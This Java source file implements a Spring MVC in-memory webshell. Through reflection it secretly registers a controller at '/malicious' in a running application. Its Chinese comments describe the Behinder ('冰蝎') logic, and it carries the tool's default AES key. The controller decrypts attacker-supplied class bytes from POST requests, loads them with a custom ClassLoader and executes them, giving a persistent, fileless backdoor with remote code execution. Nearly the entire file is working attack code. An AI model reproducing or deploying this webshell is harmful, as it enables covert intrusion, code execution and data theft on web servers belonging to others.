import org.apache.catalina.connector.CoyoteReader;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;
import java.io.*;
import java.net.*;
import java.sql.*;
import java.text.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
//import org.apache.jasper.runtime.PageContextImpl;
import org.apache.taglibs.standard.lang.jstl.test.PageContextImpl;
import org.apache.jasper.servlet.JasperLoader;


public class InjectToController extends ClassLoader {
    private final String injectUrlPath = "/malicious";
    private final String k="e45e329feb5d925b"; /* 该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond */

    public Class g(byte []b){
        return super.defineClass(b, 0, b.length);
    }

    public InjectToController(ClassLoader c){super(c);}

    public InjectToController(String aaa) {}

    public InjectToController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException {

        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class);
        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        method.setAccessible(true);
        Object  mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping);
        // java.lang.ClassLoader
        // Method method1 = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry").getDeclaredMethod("getMappings");
        // method1.setAccessible(true);
        // Map mappingLookup = (Map) method1.invoke(mappingRegistry);

        Field field = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry").getDeclaredField("urlLookup");
        field.setAccessible(true);
        Map urlLookup = (Map) field.get(mappingRegistry);
        Iterator urlIterator = urlLookup.keySet().iterator();
        while (urlIterator.hasNext()){
            String urlPath = (String) urlIterator.next();
            if (this.injectUrlPath.equals(urlPath)){
                System.out.println("URL已存在");
                return;
            }
        }
        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
        Method method2 = InjectToController.class.getMethod("test");
        // 3. 定义访问 controller 的 URL 地址
        PatternsRequestCondition url = new PatternsRequestCondition(this.injectUrlPath);
        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        // 5. 在内存中动态注册 controller
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        InjectToController injectToController = new InjectToController("aaa");
        mappingHandlerMapping.registerMapping(info, injectToController, method2);
    }

    // controller处理请求时执行的代码
    public Object test() throws Exception {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        HttpSession session = request.getSession();
//        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);


//        session.putValue("u",this.k);

        // shell.jsp中的对象情况如下
        // this.getClass().getClassLoader() -> org.apache.jasper.servlet.JasperLoader
        // pageContext -> org.apache.jasper.runtime.PageContextImpl

        // 冰蝎逻辑
        if (request.getMethod().equals("POST"))
        {
            session.setAttribute("u", this.k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2,new SecretKeySpec(this.k.getBytes(),"AES"));

            InjectToController injectToController = new InjectToController(ClassLoader.getSystemClassLoader());
            String base64String = request.getReader().readLine();
            byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String);  // base64解码
            byte[] bytesDecrypted = c.doFinal(bytesEncrypted);  // AES解密
            Class newClass = injectToController.g(bytesDecrypted);  // 调用g函数，进一步调用父类defineClass函数获得类对象

            Map<String, Object> pageContext = new HashMap<String, Object>();  // 为pageContext添加三个对象
            pageContext.put("session", session);
            pageContext.put("request", request);
            pageContext.put("response", response);
            newClass.newInstance().equals(pageContext);  // 调用被加载的恶意对象的equals方法，最终执行payload
//            new InjectToController(ClassLoader.getSystemClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
        }
        return response;  // 返回结果
    }
}
